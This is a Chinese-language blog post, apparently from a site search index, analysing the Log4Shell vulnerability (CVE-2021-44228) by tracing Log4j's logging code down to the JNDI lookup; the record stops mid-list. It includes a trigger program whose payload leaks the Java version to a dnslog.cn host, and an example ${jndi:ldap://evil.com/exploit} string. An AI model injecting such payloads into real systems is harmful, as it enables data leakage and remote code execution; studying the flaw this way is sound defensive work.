<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-44228分析</title>
    <url>/2025/01/19/CVE-2021-44228/</url>
    <content><![CDATA[<h1 id="cve-2021-44228">CVE-2021-44228</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE202144228</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(CVE202144228.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:dns://$&#123;sys:java.version&#125;.z72ouf.dnslog.cn&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;error info:&#123;&#125;&quot;</span>,message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是漏洞的触发代码： - 创建了一个Logger实例 -
构造了一个包含JNDI注入payload的字符串 -
通过logger.error()输出日志，其中包含恶意payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message, <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.logIfEnabled(FQCN, Level.ERROR, (Marker)<span class="literal">null</span>, (String)message, (Object)p0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>error方法： - 接收日志消息模板和参数 -
调用logIfEnabled方法处理日志</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEnabled(level, marker, message, p0)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logMessage(fqcn, level, marker, message, p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>logIfEnabled方法： - 检查是否启用了对应级别的日志 -
如果启用则调用logMessage处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">logMessage</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="built_in">this</span>.messageFactory.newMessage(message, p0);</span><br><span class="line">    <span class="built_in">this</span>.logMessageSafely(fqcn, level, marker, msg, msg.getThrowable());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>logMessage方法： - 通过messageFactory创建新的消息对象 -
调用logMessageSafely继续处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">logMessageSafely</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.logMessageTrackRecursion(fqcn, level, marker, message, throwable);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ReusableMessageFactory.release(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>logMessageSafely方法： - 调用logMessageTrackRecursion处理日志 -
最后释放消息对象资源</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">logMessageTrackRecursion</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        incrementRecursionDepth();</span><br><span class="line">        <span class="built_in">this</span>.tryLogMessage(fqcn, <span class="built_in">this</span>.getLocation(fqcn), level, marker, message, throwable);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        decrementRecursionDepth();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>logMessageTrackRecursion方法： - 增加递归深度计数 -
调用tryLogMessage实际处理日志 - 最后减少递归深度计数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryLogMessage</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.log(level, marker, fqcn, location, message, throwable);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="built_in">this</span>.handleLogMessageException(e, fqcn, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tryLogMessage方法： - 尝试调用log方法处理消息 - 捕获异常并进行处理 -
使用@PerformanceSensitive注解表明这是性能敏感的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Level level, Marker marker, String fqcn...)</span> &#123;</span><br><span class="line">    <span class="comment">// 编译后的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个编译后的中间方法，继续向下传递日志事件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(<span class="keyword">final</span> Supplier&lt;LoggerConfig&gt; reconfigured, ...)</span> &#123;</span><br><span class="line">    <span class="type">LoggerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="built_in">this</span>.getActiveLoggerConfig(reconfigured);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        config.log(loggerName, fqcn, location, marker, level, data, t);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        config.getReliabilityStrategy().afterLogEvent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个log方法： - 获取当前活动的LoggerConfig配置 -
调用配置的log方法处理日志事件 - 最后执行可靠性策略的后处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PerformanceSensitive(&#123;&quot;allocation&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(<span class="keyword">final</span> String loggerName, ...)</span> &#123;</span><br><span class="line">    <span class="comment">// 处理属性</span></span><br><span class="line">    List&lt;Property&gt; props = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.propertiesRequireLookup) &#123;</span><br><span class="line">        props = <span class="built_in">this</span>.properties;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.properties != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建新的属性列表</span></span><br><span class="line">        props = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(<span class="built_in">this</span>.properties.size());</span><br><span class="line">        <span class="comment">// 构建日志事件</span></span><br><span class="line">        <span class="type">LogEvent</span> <span class="variable">event</span> <span class="operator">=</span> Log4jLogEvent.newBuilder()</span><br><span class="line">            .setMessage(data)</span><br><span class="line">            .setMarker(marker)</span><br><span class="line">            .setLevel(level)</span><br><span class="line">            .setLoggerName(loggerName)</span><br><span class="line">            .setLoggerFqcn(fqcn)</span><br><span class="line">            .setThrown(t)</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理需要查找的属性值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.properties.size(); ++i) &#123;</span><br><span class="line">            <span class="type">Property</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="built_in">this</span>.properties.get(i);</span><br><span class="line">            <span class="comment">// 关键点：这里会进行字符串替换，触发JNDI查找</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> prop.isValueNeedsLookup() </span><br><span class="line">                ? <span class="built_in">this</span>.config.getStrSubstitutor().replace(event, prop.getValue()) </span><br><span class="line">                : prop.getValue();</span><br><span class="line">            props.add(Property.createProperty(prop.getName(), value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建日志事件</span></span><br><span class="line">    <span class="type">LogEvent</span> <span class="variable">logEvent</span> <span class="operator">=</span> createLogEvent(...);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.log(logEvent, LoggerConfig.LoggerConfigPredicate.ALL);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ReusableLogEventFactory.release(logEvent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法是漏洞触发的关键环节： 1. 处理日志配置的属性 2.
如果属性需要查找(lookup)，就会创建LogEvent并执行字符串替换 3.
字符串替换过程中会解析${jndi:...}这样的表达式 4.
当遇到jndi前缀时会触发JNDI查找，从而执行恶意代码 5.
最后创建完整的日志事件并进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> LoggerConfigPredicate predicate)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.isFiltered(event)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.processLogEvent(event, predicate);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一步： - 检查日志事件是否被过滤 -
如果没有被过滤，继续处理日志事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processLogEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> LoggerConfigPredicate predicate)</span> &#123;</span><br><span class="line">    event.setIncludeLocation(<span class="built_in">this</span>.isIncludeLocation());</span><br><span class="line">    <span class="keyword">if</span> (predicate.allow(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.callAppenders(event);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.logParent(event, predicate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>processLogEvent方法： - 设置是否包含位置信息 -
如果predicate允许，调用对应的Appenders - 向父级logger传递日志事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PerformanceSensitive(&#123;&quot;allocation&quot;&#125;)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">callAppenders</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    AppenderControl[] controls = <span class="built_in">this</span>.appenders.get();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; controls.length; ++i) &#123;</span><br><span class="line">        controls[i].callAppender(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>callAppenders方法： - 获取所有配置的Appender控制器 -
遍历并调用每个Appender</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callAppender</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.shouldSkip(event)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.callAppenderPreventRecursion(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">callAppenderPreventRecursion</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.recursive.set(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.callAppender0(event);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.recursive.set(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两个方法： - 检查是否应该跳过该事件 - 使用ThreadLocal防止递归调用 -
调用具体的Appender处理方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">callAppender0</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ensureAppenderStarted();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.isFilteredByAppender(event)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.tryCallAppender(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryCallAppender</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.appender.append(event);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException error) &#123;</span><br><span class="line">        <span class="built_in">this</span>.handleAppenderError(event, error);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception error) &#123;</span><br><span class="line">        <span class="built_in">this</span>.handleAppenderError(event, <span class="keyword">new</span> <span class="title class_">AppenderLoggingException</span>(error));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">append</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.tryAppend(event);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AppenderLoggingException ex) &#123;</span><br><span class="line">        <span class="built_in">this</span>.error(<span class="string">&quot;Unable to write to stream &quot;</span> + <span class="built_in">this</span>.manager.getName() + </span><br><span class="line">                  <span class="string">&quot; for appender &quot;</span> + <span class="built_in">this</span>.getName(), event, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后这几个方法展示了实际的日志写入过程： 1. 确保Appender已启动 2.
再次检查过滤器 3. 尝试写入日志 4. 处理可能的异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryAppend</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Constants.ENABLE_DIRECT_ENCODERS) &#123;</span><br><span class="line">        <span class="built_in">this</span>.directEncodeEvent(event);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.writeByteArrayToManager(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tryAppend方法： - 根据配置选择直接编码或字节数组写入 -
直接编码通常性能更好</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.getLayout().encode(event, <span class="built_in">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>directEncodeEvent方法： - 使用Layout对日志事件进行编码 -
根据需要执行刷新操作</p>
<p>关键的encode方法实现： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">this</span>.eventSerializer <span class="keyword">instanceof</span> AbstractStringLayout.Serializer2)) &#123;</span><br><span class="line">        <span class="built_in">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">text</span> <span class="operator">=</span> <span class="built_in">this</span>.toText((AbstractStringLayout.Serializer2)<span class="built_in">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="built_in">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最关键的format方法： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="comment">// 处理可以直接格式化到StringBuilder的消息</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 格式化消息内容</span></span><br><span class="line">        ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键的字符串替换逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 这里执行变量替换，触发JNDI查找</span></span><br><span class="line">                    workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理普通消息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> msg.getFormattedMessage();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 同样会执行变量替换</span></span><br><span class="line">            toAppendTo.append(<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>) </span><br><span class="line">                ? <span class="built_in">this</span>.config.getStrSubstitutor().replace(event, result) </span><br><span class="line">                : result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这段代码揭示了漏洞的具体触发点： 1. 在格式化日志消息时，会检查<span
class="math inline">\({开头的模式
2. 对于这种模式，会调用StringSubstitutor进行变量替换
3. 当遇到\)</span>{jndi:...}时，会通过JNDI执行查找 4.
这个查找过程可能导致远程代码执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是替换入口： - 接收日志事件和源字符串 - 创建StringBuilder进行处理 -
根据替换结果返回原字符串或新字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> offset, <span class="keyword">final</span> <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.substitute(event, buf, offset, length, (List)<span class="literal">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个中间方法，调用主要的substitute方法。</p>
<p>核心的substitute方法实现了变量替换的主要逻辑：</p>
<ol type="1">
<li><p>初始化处理： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StrMatcher</span> <span class="variable">prefixMatcher</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariablePrefixMatcher(); <span class="comment">// 匹配 $&#123;</span></span><br><span class="line"><span class="type">StrMatcher</span> <span class="variable">suffixMatcher</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariableSuffixMatcher(); <span class="comment">// 匹配 &#125;</span></span><br><span class="line"><span class="type">char</span> <span class="variable">escape</span> <span class="operator">=</span> <span class="built_in">this</span>.getEscapeChar();                         <span class="comment">// 转义字符</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>查找变量的主循环： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(pos &lt; bufEnd) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">startMatchLen</span> <span class="operator">=</span> prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">    <span class="keyword">if</span> (startMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">        ++pos;  <span class="comment">// 没找到变量标记，继续</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape) &#123;</span><br><span class="line">        <span class="comment">// 处理转义的变量标记</span></span><br><span class="line">        buf.deleteCharAt(pos - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 找到变量开始标记，开始处理</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>变量提取和处理： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">varNameExpr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars, startPos + startMatchLen, </span><br><span class="line">                               pos - startPos - startMatchLen);</span><br><span class="line"><span class="keyword">if</span> (substitutionInVariablesEnabled) &#123;</span><br><span class="line">    <span class="comment">// 递归处理嵌套变量</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">bufName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(varNameExpr);</span><br><span class="line">    <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">    varNameExpr = bufName.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>变量解析和替换： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> <span class="built_in">this</span>.resolveVariable(event, varName, buf, startPos, pos);</span><br><span class="line"><span class="keyword">if</span> (varValue != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 替换变量值并递归处理</span></span><br><span class="line">    buf.replace(startPos, pos, varValue);</span><br><span class="line">    <span class="type">int</span> <span class="variable">change</span> <span class="operator">=</span> <span class="built_in">this</span>.substitute(event, buf, startPos, varLen, priorVariables);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="literal">null</span> ? <span class="literal">null</span> : resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法很简单： - 获取变量解析器 - 调用解析器的lookup方法</p>
<p>关键的lookup方法实现： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 查找前缀分隔符(:)</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(<span class="number">58</span>);  <span class="comment">// 58是冒号的ASCII码</span></span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 提取前缀(如jndi)和名称部分</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 根据前缀获取对应的查找器</span></span><br><span class="line">        <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> (StrLookup)<span class="built_in">this</span>.strLookupMap.get(prefix);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置配置信息</span></span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware)lookup).setConfiguration(<span class="built_in">this</span>.configuration);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行实际的查找</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果查找失败，去掉前缀再试</span></span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用默认查找器尝试解析</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? </span><br><span class="line">            <span class="built_in">this</span>.defaultLookup.lookup(<span class="keyword">var</span>) : </span><br><span class="line">            <span class="built_in">this</span>.defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里是Log4Shell漏洞的最终触发点：</p>
<ol type="1">
<li>对于${jndi:ldap://evil.com/exploit}这样的payload：
<ul>
<li>prefix 会是 "jndi"</li>
<li>name 会是 "ldap://evil.com/exploit"</li>
</ul></li>
